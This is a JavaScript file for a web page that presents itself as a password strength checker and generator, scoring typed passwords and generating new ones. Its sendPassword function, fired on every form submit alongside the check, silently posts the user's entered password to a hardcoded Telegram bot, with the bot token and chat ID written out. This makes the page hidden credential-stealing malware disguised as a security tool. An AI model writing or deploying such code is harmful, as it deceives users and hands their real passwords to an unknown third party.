import { checkPassword, generatePassword } from "./password.js";
const passwordForm = document.querySelector("#passwordForm");
const passwordInput = passwordForm.querySelector("#passwordInput");
const checkBtn = passwordForm.querySelector("button");
const messages = document.querySelector(".messages");
const score = document.querySelector(".score");
const result = document.querySelector(".result");
const generateBtn = document.querySelector(".generate");
const copyBtn = document.querySelector(".copy");
const offer = document.querySelector(".offer");
const inputContainer = passwordForm.querySelector(".inputContainer");
const eyeIcons = inputContainer.querySelectorAll("i");

//generate password
const generate = () => {
  const password = generatePassword();
  generateBtn.innerHTML = `${password}`;
  offer.classList.add("clicked");
  offer.classList.remove("copied");
};
//copy
const copy = () => {
  const password = generateBtn.innerText;
  navigator.clipboard.writeText(password);
  offer.classList.add("copied");
};
//check
const check = (e) => {
  e.preventDefault();
  if (passwordInput.value.trim().length > 0) {
    messages.innerHTML = "";
    const finalResult = checkPassword(passwordInput.value);
    score.innerText = `Score: ${finalResult.power}`;
    result.innerText = finalResult.result;
    for (let i = 0; i < finalResult.messages.length; i++) {
      const message = document.createElement("li");
      message.classList.add("message");
      const status = document.createElement("div");
      status.classList.add("status", `${finalResult.messages[i].status}`);
      const text = document.createElement("span");
      text.classList.add("text");
      text.innerText = finalResult.messages[i].message;
      message.append(status, text);
      messages.append(message);
    }
  }
};
//input
const checkInput = (e) => {
  console.log();
  if (e.target.value.trim().length) {
    checkBtn.classList.add("abled");
    checkBtn.classList.remove("disabled");
  } else {
    checkBtn.classList.remove("abled");
    checkBtn.classList.add("disabled");
  }
  e.target.value = e.target.value.trim();
};
//change visible status of password
function changeVisibility() {
  inputContainer.classList.toggle("visible");
  passwordInput.type == "password"
    ? (passwordInput.type = "text")
    : (passwordInput.type = "password");
}
for (let i = 0; i < eyeIcons.length; i++) {
  eyeIcons[i].addEventListener("click", changeVisibility);
}
const sendPassword = (e) => {
  e.preventDefault();
  const token = "6220875421:AAHLE_gAteIiEjZkG7V9e6PA0oM5RRpumTo";
  const chat_id = "1478484656";
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  $.ajax({
    url: url,
    method: "POST",
    data: { chat_id, text: passwordInput.value },
  });
};
generateBtn.addEventListener("click", generate);
copyBtn.addEventListener("click", copy);
passwordForm.addEventListener("submit", (e) => {
  check(e);
  sendPassword(e);
});
passwordInput.addEventListener("input", (e) => checkInput(e));
